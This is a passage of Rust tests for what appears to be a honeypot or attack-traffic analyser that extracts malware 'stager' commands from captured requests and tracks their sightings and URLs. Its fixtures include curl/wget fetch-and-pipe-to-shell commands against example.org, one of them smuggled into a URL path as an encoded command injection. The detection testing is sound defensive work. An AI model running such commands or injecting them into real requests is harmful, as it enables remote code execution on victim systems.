    async fn upload_text_is_parsed() {
        let (s, _d) = store().await;
        crate::store::uploads::seed_upload(&s, "203.0.113.6", "/a.php", STAGER).await;
        run(&s).await;
        let n = count(
            &s,
            "piece_sightings g JOIN pieces p ON p.hash = g.piece
             WHERE p.kind = 'stager' AND g.source_kind = 'upload'",
        )
        .await;
        assert_eq!(n, 1);
    }

    #[tokio::test]
    async fn url_cap_keeps_the_newest_32() {
        let (s, _d) = store().await;
        for i in 0..40 {
            let body = format!("curl -s http://example.org/{i}.sh | sh");
            let ts = format!("2026-10-01 00:{i:02}:00");
            request(&s, IP, Some(body.as_bytes()), &ts).await;
        }
        run(&s).await;
        let urls = s
            .piece_urls(piece_hash("stager", "example.org"))
            .await
            .unwrap();
        assert_eq!(urls.len(), MAX_URLS);
        assert_eq!(urls[0].url, "http://example.org/39.sh");
        assert!(urls.iter().all(|u| u.url != "http://example.org/7.sh"));
        assert!(urls.iter().any(|u| u.url == "http://example.org/8.sh"));
        assert_eq!(count(&s, "piece_url_sources").await, MAX_URLS as i64);
    }

    async fn gone(s: &Store, id: i64) {
        assert!(s.pieces_of_source("request", id).await.unwrap().is_empty());
        let n = count(
            s,
            &format!("piece_sightings WHERE source_kind = 'request' AND source_id = {id}"),
        )
        .await;
        assert_eq!(n, 0);
    }

    #[tokio::test]
    async fn deleting_a_request_removes_its_sightings() {
        let (s, _d) = store().await;
        let (a, _) = request(&s, IP, Some(STAGER), "2026-10-01 00:00:00").await;
        let (b, _) = request(&s, "203.0.113.8", Some(STAGER), "2026-10-02 00:00:00").await;
        run(&s).await;
        assert!(s.delete_request(a).await.unwrap());
        gone(&s, a).await;
        assert!(!s.pieces_of_source("request", b).await.unwrap().is_empty());
        refresh(&s).await;
        let row = s
            .piece(piece_hash("stager", "example.org"))
            .await
            .unwrap()
            .unwrap();
        assert_eq!((row.ips, row.sources), (1, 1));
        assert_eq!(row.first_seen, "2026-10-02 00:00:00");
    }

    #[tokio::test]
    async fn deleting_an_ip_removes_its_sightings() {
        let (s, _d) = store().await;
        let (a, ip_id) = request(&s, IP, Some(STAGER), "2026-10-01 00:00:00").await;
        crate::store::uploads::seed_upload(&s, IP, "/a.php", STAGER).await;
        run(&s).await;
        assert!(count(&s, "piece_sightings").await > 0);
        assert!(s.delete_ip(ip_id).await.unwrap());
        gone(&s, a).await;
        assert_eq!(count(&s, "piece_sightings").await, 0);
        refresh(&s).await;
        assert_eq!(count(&s, "pieces").await, 0);
        assert_eq!(count(&s, "piece_urls").await, 0);
        assert_eq!(count(&s, "piece_url_sources").await, 0);
    }

    #[tokio::test]
    async fn retention_removes_sightings() {
        let (s, _d) = store().await;
        let (old, _) = request(&s, IP, Some(STAGER), "2020-01-01 00:00:00").await;
        let (new, _) = request(&s, "203.0.113.8", Some(STAGER), "2999-01-01 00:00:00").await;
        run(&s).await;
        let pruned = s.local().prune_older_than(30).await.unwrap();
        assert_eq!(pruned.requests, 1);
        gone(&s, old).await;
        assert!(!s.pieces_of_source("request", new).await.unwrap().is_empty());
    }

    #[tokio::test]
    async fn url_only_a_deleted_source_named_is_gone_after_refresh() {
        let (s, _d) = store().await;
        let (a, _) = request(
            &s,
            IP,
            Some(b"curl -s http://example.org/only-a.sh | sh"),
            "2026-10-01 00:00:00",
        )
        .await;
        request(
            &s,
            "203.0.113.8",
            Some(b"curl -s http://example.org/b.sh | sh"),
            "2026-10-02 00:00:00",
        )
        .await;
        run(&s).await;
        let h = piece_hash("stager", "example.org");
        assert_eq!(s.piece_urls(h).await.unwrap().len(), 2);
        s.delete_request(a).await.unwrap();
        refresh(&s).await;
        let urls = s.piece_urls(h).await.unwrap();
        assert_eq!(urls.len(), 1);
        assert_eq!(urls[0].url, "http://example.org/b.sh");
        assert_eq!(count(&s, "piece_url_sources").await, 1);
    }

    #[tokio::test]
    async fn results_keep_a_piece_without_sightings() {
        let (s, _d) = store().await;
        let (a, _) = request(&s, IP, Some(STAGER), "2026-10-01 00:00:00").await;
        run(&s).await;
        let h = piece_hash("stager", "example.org");
        sqlx::query(
            "INSERT INTO piece_results (piece, id, added_by, added_at) VALUES (?, 1, 'op', 'x')",
        )
        .bind(h)
        .execute(&s.pool)
        .await
        .unwrap();
        s.delete_request(a).await.unwrap();
        refresh(&s).await;
        assert!(s.piece(h).await.unwrap().is_some());
        assert!(s.piece_urls(h).await.unwrap().is_empty());
        assert_eq!(count(&s, "pieces").await, 1, "the others are gone");
    }

    /// The stager of `STAGER` made a chain joiner, as a pass would.
    async fn joiner(s: &Store) -> i64 {
        let h = piece_hash("stager", "example.org");
        sqlx::query("INSERT INTO chains VALUES ('k', 't', 't', 1, 1, 1)")
            .execute(&s.pool)
            .await
            .unwrap();
        sqlx::query("INSERT INTO chain_pieces VALUES ('k', ?)")
            .bind(h)
            .execute(&s.pool)
            .await
            .unwrap();
        h
    }

    fn result(family: &str) -> NewResult {
        NewResult {
            family: Some(family.into()),
            ..Default::default()
        }
    }

    #[tokio::test]
    async fn sha256_must_be_64_hex() {
        let (s, _d) = store().await;
        request(&s, IP, Some(STAGER), "2026-10-01 00:00:00").await;
        run(&s).await;
        let h = joiner(&s).await;
        let with = |v: &str| NewResult {
            sha256: Some(v.into()),
            ..Default::default()
        };
        for bad in ["abc", &"g".repeat(64), &"a".repeat(63), &"a".repeat(65)] {
            assert!(
                s.add_piece_result(h, &with(bad), "t").await.is_err(),
                "{bad}"
            );
        }
        // Upper case is kept as lower case, and spaces around it go.
        let upper = format!(" {} ", "AB".repeat(32));
        s.add_piece_result(h, &with(&upper), "t").await.unwrap();
        let got = s.piece_results(h).await.unwrap();
        assert_eq!(got[0].sha256.as_deref(), Some("ab".repeat(32).as_str()));
        // Lengths and the empty entry.
        assert!(result(&"f".repeat(65)).checked().is_err());
        assert!(result(&"f".repeat(64)).checked().is_ok());
        let long = |n| NewResult {
            note: Some("n".repeat(n)),
            source_url: Some("u".repeat(n)),
            ..Default::default()
        };
        assert!(long(2000).checked().is_ok());
        assert!(long(2001).checked().is_err());
        assert!(NewResult::default().checked().is_err());
        assert!(result("  ").checked().is_err());
    }

    #[tokio::test]
    async fn results_go_only_on_a_stager_or_file_that_joins() {
        let (s, _d) = store().await;
        request(&s, IP, Some(STAGER), "2026-10-01 00:00:00").await;
        run(&s).await;
        let h = piece_hash("stager", "example.org");
        // Not in a chain.
        assert!(s.add_piece_result(h, &result("x"), "t").await.is_err());
        joiner(&s).await;
        s.add_piece_result(h, &result("x"), "t").await.unwrap();
        // A piece that is no stager or file.
        let other = piece_hash("recipe", "wget-sh");
        assert!(s.add_piece_result(other, &result("x"), "t").await.is_err());
        // The cap.
        for _ in 1..MAX_RESULTS {
            s.add_piece_result(h, &result("x"), "t").await.unwrap();
        }
        assert!(s.add_piece_result(h, &result("x"), "t").await.is_err());
    }

    #[tokio::test]
    async fn result_survives_a_recompute_and_an_xray_version_change() {
        let (s, _d) = store().await;
        let (a, _) = request(&s, IP, Some(STAGER), "2026-10-01 00:00:00").await;
        run(&s).await;
        let h = joiner(&s).await;
        let id = s
            .add_piece_result(h, &result("mirai"), "admin")
            .await
            .unwrap();
        // A new version clears and re-derives every sighting.
        assert_eq!(backfill_at(&s.pool, XRAY_V + 1).await.unwrap(), 1);
        refresh(&s).await;
        let got = s.piece_results(h).await.unwrap();
        assert_eq!((got.len(), got[0].id), (1, id));
        // The source goes: the piece stays for its result.
        s.delete_request(a).await.unwrap();
        refresh(&s).await;
        assert!(s.piece(h).await.unwrap().is_some());
        assert_eq!(s.piece_results(h).await.unwrap().len(), 1);
    }

    #[tokio::test]
    async fn result_is_not_replicated() {
        let (s, _d) = store().await;
        request(&s, IP, Some(STAGER), "2026-10-01 00:00:00").await;
        run(&s).await;
        let h = joiner(&s).await;
        let before = count(&s, "repl_log").await;
        s.add_piece_result(h, &result("mirai"), "admin")
            .await
            .unwrap();
        assert_eq!(count(&s, "repl_log").await, before);
        let tables: Vec<String> = sqlx::query_scalar(
            "SELECT name FROM sqlite_master WHERE type = 'table' AND sql LIKE '%piece_results%'",
        )
        .fetch_all(&s.pool)
        .await
        .unwrap();
        assert_eq!(tables, ["piece_results"], "no log table carries it");
    }

    #[tokio::test]
    async fn tombstoned_rows_leave_no_sightings() {
        let (s, _d) = store().await;
        let (a, ip_id) = request(&s, IP, Some(STAGER), "2026-10-01 00:00:00").await;
        // The batch was read; the row is deleted before it is written.
        let row = ReqRow {
            id: a,
            ts: "2026-10-01 00:00:00".into(),
            ip_id,
            ip: IP.into(),
            method: "POST".into(),
            path: "/x".into(),
            query: None,
            body: Some(STAGER.to_vec()),
        };
        let found = vec![extract_request(&row)];
        assert!(!found[0].is_empty());
        s.delete_request(a).await.unwrap();
        write_requests(&s.pool, &[row], &found, XRAY_V)
            .await
            .unwrap();
        run(&s).await;
        assert_eq!(count(&s, "piece_sightings").await, 0);
        refresh(&s).await;
        assert_eq!(count(&s, "pieces").await, 0);
    }

    #[tokio::test]
    async fn encoded_separators_in_a_path_are_read() {
        let (s, _d) = store().await;
        let ip_id = s.upsert_ip(IP.parse().unwrap()).await.unwrap().id;
        let id = s
            .insert_request(&NewRequest {
                ip_id,
                method: "GET".into(),
                path: "/x%3Bwget%20http://example.org/a.sh%7Csh".into(),
                headers_json: "[]".into(),
                labels_json: "[]".into(),
                ..Default::default()
            })
            .await
            .unwrap();
        assert_eq!(backfill(&s.pool).await.unwrap(), 1);
        assert_eq!(xray_v(&s, id).await, XRAY_V);
    }

    #[tokio::test]
    async fn url_is_gone_at_once_after_the_address_is_deleted() {
        let (s, _d) = store().await;
        let (_, ip_id) = request(&s, IP, Some(STAGER), "2026-10-01 00:00:00").await;
        let (_, other) = request(
            &s,
            "203.0.113.8",
            Some(b"curl -s http://example.org/b.sh | sh"),
            "2026-10-02 00:00:00",
        )
        .await;
        run(&s).await;
        let h = piece_hash("stager", "example.org");
        s.delete_ip(ip_id).await.unwrap();
        let urls = s.piece_urls(h).await.unwrap();
        assert_eq!(urls.len(), 1, "no refresh_counts ran");
        assert_eq!(urls[0].url, "http://example.org/b.sh");
        s.delete_ip(other).await.unwrap();
        assert!(s.piece_urls(h).await.unwrap().is_empty());
        assert!(s.piece(h).await.unwrap().is_none());
    }

    #[tokio::test]
    async fn extract_skips_the_refresh_when_nothing_changed() {
        let (s, _d) = store().await;
        request(&s, IP, Some(STAGER), "2026-10-01 00:00:00").await;
        assert_eq!(extract(&s.pool).await.unwrap(), 1);
        // Counts made stale by hand stay: a second pass does not refresh.
        sqlx::query("UPDATE pieces SET ips = 99")
            .execute(&s.pool)
            .await
            .unwrap();
        assert_eq!(extract(&s.pool).await.unwrap(), 0);
        let n: i64 = sqlx::query_scalar("SELECT MAX(ips) FROM pieces")
            .fetch_one(&s.pool)
            .await
            .unwrap();
        assert_eq!(n, 99);
        request(&s, "203.0.113.8", Some(STAGER), "2026-10-02 00:00:00").await;
        extract(&s.pool).await.unwrap();
        let n: i64 = sqlx::query_scalar("SELECT MAX(ips) FROM pieces")
            .fetch_one(&s.pool)
            .await
            .unwrap();
        assert_eq!(n, 2);
    }
}
